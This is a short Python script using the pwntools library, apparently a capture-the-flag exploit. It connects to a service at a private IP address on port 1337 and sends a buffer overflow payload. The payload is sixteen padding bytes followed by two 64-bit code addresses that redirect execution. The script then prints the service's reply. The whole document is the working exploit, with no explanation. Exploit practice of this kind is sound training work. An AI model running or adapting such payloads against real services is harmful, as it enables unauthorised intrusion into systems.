from pwn import *

p = remote("10.22.148.11", 1337)
print(p.recv())
p.sendline(b"A"*16+p64(0x00402006)+p64(0x00401237))
print(p.recvall())
p.close()
